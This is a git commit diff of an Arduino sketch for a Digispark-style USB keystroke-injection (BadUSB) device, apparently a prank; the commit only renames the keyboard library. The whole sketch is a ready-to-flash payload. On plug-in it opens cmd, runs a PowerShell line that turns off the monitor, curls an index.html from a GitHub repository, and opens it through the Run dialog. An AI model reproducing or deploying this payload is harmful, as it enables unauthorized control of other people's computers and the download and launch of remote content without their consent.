7abc4f97e36c88f1ce53ce63106b2a184e4813c7
Isht4r <69462380+Isht4r@users.noreply.github.com>
2021-02-12 13:22:20 +0100

    Update darling_roll.ino

--- darling_roll.ino
+++ darling_roll.ino
@@ -1,35 +1,35 @@
 #include "DigiKeyboard.h"
-//#include "DigiKeyboardDe.h" //for De Layout
+//#include "DigiKeyboardDe.h" //for De Layout and "DigiKeyboardDe" instead of "DigiKeyboard"
 
 void setup() {
-  //DigiMouse.begin();
+
 }
 void loop() {
-  DigiKeyboardDe.delay(100);
-  DigiKeyboardDe.sendKeyStroke(KEY_Q, MOD_GUI_LEFT);
-  DigiKeyboardDe.delay(200);
-  DigiKeyboardDe.print("cmd");
-  DigiKeyboardDe.delay(80);
-  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
-  DigiKeyboardDe.delay(600);
-  DigiKeyboardDe.print("powershell (Add-Type '[DllImport(\\");
-  DigiKeyboardDe.print("\"user32.dll\\");
-  DigiKeyboardDe.print("\")]^public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)");
-  DigiKeyboardDe.delay(80);
-  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
-  DigiKeyboardDe.print("curl https://raw.githubusercontent.com/Isht4r/darling_roll/5859d22e3f484cb14cb9b9a3465bb0d1a042c569/index.html -O index.html");
-  DigiKeyboardDe.delay(80);
-  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
-  DigiKeyboardDe.delay(2200);
-  DigiKeyboardDe.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
-  DigiKeyboardDe.delay(2200);
+  DigiKeyboard.delay(100);
+  DigiKeyboard.sendKeyStroke(KEY_Q, MOD_GUI_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.print("cmd");
+  DigiKeyboard.delay(80);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(600);
+  DigiKeyboard.print("powershell (Add-Type '[DllImport(\\");
+  DigiKeyboard.print("\"user32.dll\\");
+  DigiKeyboard.print("\")]^public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)");
+  DigiKeyboard.delay(80);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print("curl https://raw.githubusercontent.com/Isht4r/darling_roll/5859d22e3f484cb14cb9b9a3465bb0d1a042c569/index.html -O index.html");
+  DigiKeyboard.delay(80);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(2200);
+  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);
+  DigiKeyboard.delay(2200);
   
-  DigiKeyboardDe.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  DigiKeyboardDe.delay(80);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(80);
   
-  DigiKeyboardDe.print("index.html");
-  DigiKeyboardDe.delay(200);
-  DigiKeyboardDe.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.print("index.html");
+  DigiKeyboard.delay(200);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
   
   for(;;){ /*empty*/ }
 }
